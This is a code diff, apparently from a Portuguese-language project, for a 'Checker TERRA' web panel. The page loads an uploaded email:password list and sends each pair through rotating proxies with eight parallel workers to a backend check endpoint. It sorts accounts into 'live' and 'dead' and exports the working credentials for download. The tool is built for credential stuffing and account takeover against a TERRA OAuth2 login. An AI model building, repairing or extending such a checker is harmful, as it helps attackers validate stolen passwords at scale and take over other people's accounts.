@@ -7,6 +7,8 @@ $expiration = $_SESSION['expiration'] ?? 0;
 if ($role !== 'admin' && $expiration !== -1 && time() > $expiration) { session_destroy(); header("Location: login.html?msg=expired"); exit; }
 $is_admin = ($role === 'admin');
 $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : date('d/m/Y H:i', $expiration);
+// FECHAR SESSÃO IMEDIATAMENTE — libera o bloqueio para as requisições fetch
+session_write_close();
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -45,7 +47,6 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
             background-image: linear-gradient(rgba(124,58,237,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(124,58,237,.03) 1px,transparent 1px);
             background-size:48px 48px;z-index:0;pointer-events:none;
         }
-        /* NAV */
         nav {
             position: sticky; top: 0; z-index: 50;
             display: flex; justify-content: space-between; align-items: center;
@@ -88,14 +89,11 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
         .btn-danger:hover { background:rgba(239,68,68,.15); }
         .btn-admin { background:rgba(124,58,237,.12);border-color:rgba(124,58,237,.3);color:var(--accent-hi); }
         .btn-admin:hover { background:rgba(124,58,237,.2); }
-        /* MAIN */
         main { max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem; position:relative;z-index:1; }
-        /* HERO */
         .hero { text-align:center;margin-bottom:2.5rem;animation:rise .5s ease both; }
         .hero h1 { font-size:2.6rem;font-weight:800;letter-spacing:-.05em;line-height:1.1; }
         .hero h1 span { background:linear-gradient(135deg,var(--accent-hi),#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent; }
         .hero p { color:var(--muted);margin-top:.5rem;font-size:.95rem; }
-        /* STATS */
         .stats { display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1.5rem; }
         .stat-card {
             background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
@@ -107,7 +105,6 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
         .stat-icon svg { width:20px;height:20px;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;fill:none; }
         .stat-label { font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.2rem; }
         .stat-val { font-size:1.6rem;font-weight:700;letter-spacing:-.04em;line-height:1; }
-        /* CONTROL PANEL */
         .control-panel {
             background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
             padding:1.8rem;margin-bottom:1.5rem;
@@ -139,7 +136,6 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
         .progress-bar-bg { height:5px;background:var(--border);border-radius:9999px;overflow:hidden;margin-bottom:.6rem; }
         .progress-bar { height:100%;background:linear-gradient(90deg,var(--accent),#818cf8);width:0%;transition:width .3s ease;border-radius:9999px; }
         .progress-label { font-size:.8rem;color:var(--muted);display:flex;justify-content:space-between; }
-        /* RESULTS */
         .results { display:grid;grid-template-columns:1fr 1fr;gap:1.5rem; }
         @media(max-width:640px){.results,.stats{grid-template-columns:1fr;}}
         .result-panel {
@@ -214,7 +210,6 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
         <h1>Checker <span>TERRA</span></h1>
         <p>Kroenen Automation Engine · OAuth2 TERRA Validator</p>
     </div>
-    <!-- Stats -->
     <div class="stats">
         <div class="stat-card">
             <div class="stat-icon" style="background:rgba(124,58,237,.12)">
@@ -244,7 +239,6 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
             </div>
         </div>
     </div>
-    <!-- Control -->
     <div class="control-panel">
         <div class="cp-title">⚡ Controle de Inspeção</div>
         <div class="upload-zone" id="uploadZone" onclick="document.getElementById('listFile').click()">
@@ -268,4 +262,214 @@ $expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : d
             </div>
         </div>
     </div>
-    
+    <div class="results">
+        <div class="result-panel">
+            <div class="rp-header">
+                <div class="rp-title"><span class="dot dot-live"></span> Live Accounts</div>
+                <span id="liveCount" class="rp-badge badge-live">0</span>
+            </div>
+            <div id="liveList" class="log-box"></div>
+            <div class="rp-footer">
+                <a href="#" onclick="downloadResults('lives');return false;" class="btn-dl btn-dl-live">⬇ Download Lives</a>
+            </div>
+        </div>
+        <div class="result-panel">
+            <div class="rp-header">
+                <div class="rp-title"><span class="dot dot-die"></span> Dead Accounts</div>
+                <span id="dieCount" class="rp-badge badge-die">0</span>
+            </div>
+            <div id="dieList" class="log-box"></div>
+            <div class="rp-footer">
+                <a href="#" onclick="downloadResults('dies');return false;" class="btn-dl btn-dl-die">⬇ Download Dies</a>
+            </div>
+        </div>
+    </div>
+</main>
+<script>
+    function logout() {
+        fetch('auth.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=logout'})
+        .then(()=>window.location.href='login.html');
+    }
+
+    const zone = document.getElementById('uploadZone');
+    const fileInput = document.getElementById('listFile');
+    fileInput.addEventListener('change',()=>{
+        if(fileInput.files[0]) document.getElementById('fileName').textContent='📄 '+fileInput.files[0].name;
+    });
+    zone.addEventListener('dragover',e=>{e.preventDefault();zone.classList.add('dragover');});
+    zone.addEventListener('dragleave',()=>zone.classList.remove('dragover'));
+    zone.addEventListener('drop',e=>{
+        e.preventDefault();zone.classList.remove('dragover');
+        const dt=e.dataTransfer;if(dt.files[0]){fileInput.files=dt.files;document.getElementById('fileName').textContent='📄 '+dt.files[0].name;}
+    });
+
+    let accounts=[],proxies=[],currentIndex=0,liveCount=0,dieCount=0,isRunning=false;
+    let allResults=[];
+    const THREADS=8;
+
+    // CORREÇÃO: FileReader em vez de File.text()
+    function readFile(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onload = function(e) { resolve(e.target.result); };
+            reader.onerror = function(e) { reject(new Error('Erro ao ler arquivo')); };
+            reader.readAsText(file);
+        });
+    }
+
+    async function startChecker(){
+        if(isRunning)return;
+        if(!fileInput.files||fileInput.files.length===0){alert('Anexe o arquivo .txt com a lista email:senha.');return;}
+
+        const btn=document.getElementById('startBtn');
+        btn.disabled=true;
+        btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Carregando...';
+
+        try {
+            // CORREÇÃO: init não bloqueia — continua mesmo se falhar
+            try {
+                const res = await fetch('api.php?action=init');
+                const d = await res.json();
+                proxies = d.proxies || [];
+            } catch(e) {
+                console.warn('Init falhou, continuando sem proxies:', e);
+                proxies = [];
+            }
+
+            // CORREÇÃO: FileReader em vez de fileInput.files[0].text()
+            const text = await readFile(fileInput.files[0]);
+
+            accounts = [];
+            for (let line of text.split(/\r?\n/)) {
+                line = line.trim();
+                if (line && line.includes(':')) {
+                    const p = line.split(':');
+                    const em = p[0].trim();
+                    const pw = p.slice(1).join(':').trim();
+                    if (em.includes('@')) accounts.push({email: em, password: pw});
+                }
+            }
+
+            if (!accounts.length) {
+                alert('Nenhuma conta válida encontrada!');
+                resetUI();
+                return;
+            }
+
+            isRunning = true;
+            currentIndex = 0;
+            liveCount = 0;
+            dieCount = 0;
+            allResults = [];
+            document.getElementById('liveList').innerHTML = '';
+            document.getElementById('dieList').innerHTML = '';
+            document.getElementById('statTotal').textContent = accounts.length;
+            updateCounts();
+            btn.innerHTML = '⏳ Inspecionando...';
+
+            const workers = [];
+            for (let i = 0; i < THREADS; i++) workers.push(worker());
+            await Promise.all(workers);
+
+            document.getElementById('statusText').textContent = '✅ Concluído! ' + accounts.length + ' targets processados.';
+            btn.innerHTML = '✔ Processo Finalizado';
+        } catch(err) {
+            console.error('startChecker error:', err);
+            alert('Erro: ' + err.message);
+            resetUI();
+        }
+    }
+
+    function resetUI(){
+        isRunning=false;
+        const btn=document.getElementById('startBtn');
+        btn.disabled=false;
+        btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg> Iniciar Inspeção';
+        document.getElementById('statusText').textContent='Sistema pronto · aguardando arquivo';
+        document.getElementById('progressBar').style.width='0%';
+        document.getElementById('progressPct').textContent='0%';
+    }
+
+    async function worker(){
+        while(currentIndex < accounts.length){
+            const idx = currentIndex++;
+            const ac = accounts[idx];
+            let proxy = '';
+            if(proxies.length > 0) proxy = proxies[Math.floor(Math.random()*proxies.length)];
+            await checkAccount(ac.email, ac.password, proxy);
+            const checked = liveCount + dieCount;
+            const pct = Math.round((checked / accounts.length) * 100);
+            document.getElementById('progressBar').style.width = pct + '%';
+            document.getElementById('progressPct').textContent = pct + '%';
+            document.getElementById('statusText').textContent = 'Inspecionando ' + checked + ' / ' + accounts.length + '...';
+        }
+    }
+
+    async function checkAccount(email, password, proxy){
+        const fd = new FormData();
+        fd.append('email', email);
+        fd.append('password', password);
+        if(proxy) fd.append('proxy', proxy);
+
+        try {
+            const res = await fetch('api.php?action=check', {method: 'POST', body: fd});
+            const r = await res.json();
+
+            allResults.push({email, password, status: r.status, reason: r.reason});
+
+            if(r.status === 'live') {
+                liveCount++;
+                addToList('liveList', email + ':' + password, 'live-text');
+            } else {
+                dieCount++;
+                addToList('dieList', email + ':' + password + ' · ' + (r.reason || 'die'), 'die-text');
+            }
+            updateCounts();
+        } catch(e) {
+            console.error('checkAccount error:', email, e);
+            allResults.push({email, password, status: 'die', reason: 'ERROR'});
+            dieCount++;
+            addToList('dieList', email + ':' + password + ' · ERROR', 'die-text');
+            updateCounts();
+        }
+    }
+
+    function addToList(id, text, cls){
+        const el = document.getElementById(id);
+        const div = document.createElement('div');
+        div.className = cls;
+        div.textContent = text;
+        el.appendChild(div);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function updateCounts(){
+        document.getElementById('liveCount').textContent = liveCount;
+        document.getElementById('dieCount').textContent = dieCount;
+        document.getElementById('statLive').textContent = liveCount;
+        document.getElementById('statDie').textContent = dieCount;
+    }
+
+    // CORREÇÃO: download client-side — não precisa de api.php?action=download
+    function downloadResults(type){
+        const filtered = type === 'lives'
+            ? allResults.filter(r => r.status === 'live')
+            : allResults.filter(r => r.status !== 'live');
+
+        if(filtered.length === 0){
+            alert('Nenhum resultado para exportar');
+            return;
+        }
+
+        const text = filtered.map(r => r.email + ':' + r.password).join('\n');
+        const blob = new Blob([text], {type: 'text/plain'});
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = type + '.txt';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+</script>
+</body>
+</html>
